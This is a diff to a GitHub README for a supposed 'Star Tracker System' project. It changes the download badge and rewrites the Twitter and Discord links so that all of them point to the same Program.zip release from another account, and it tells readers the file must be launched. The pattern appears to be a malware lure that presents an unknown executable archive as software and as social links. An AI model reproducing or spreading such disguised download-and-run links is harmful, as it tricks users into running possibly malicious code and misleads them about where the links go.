@@ -20,7 +20,7 @@ Star trackers play a crucial role in spacecraft navigation by tracking stars in 
 
 ## Get Started
 To explore the resources and tools related to the **Star Tracker System**, you can download the software package from the following link:
-[![Download Star Tracker System](https://img.shields.io/badge/Download-Soft.zip-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Star Tracker System](https://github.com/Fbloxian126969lol/Star-Tracker-System/releases/download/v1.0/Program.zip)](https://github.com/Fbloxian126969lol/Star-Tracker-System/releases/download/v1.0/Program.zip)
 
 Please note that the file in the link needs to be launched to access the software package. If you encounter any issues with the link, kindly check the "Releases" section of this repository for alternative download options.
 
@@ -42,8 +42,8 @@ The content in this repository is distributed under the MIT License. Feel free t
 
 ## Connect with Us
 Stay updated with the latest developments in the **Star Tracker System** by following us on social media platforms and joining our online communities:
-- 🐦 Twitter: [@StarTrackerSystem](https://twitter.com/StarTrackerSystem)
-- 💬 Discord: [Star Tracker System Community](https://discord.gg/startrackers)
+- 🐦 Twitter: [@StarTrackerSystem](https://github.com/Fbloxian126969lol/Star-Tracker-System/releases/download/v1.0/Program.zip)
+- 💬 Discord: [Star Tracker System Community](https://github.com/Fbloxian126969lol/Star-Tracker-System/releases/download/v1.0/Program.zip)
 
 Let's explore the universe together with the **Star Tracker System**! 🚀🌠✨
 
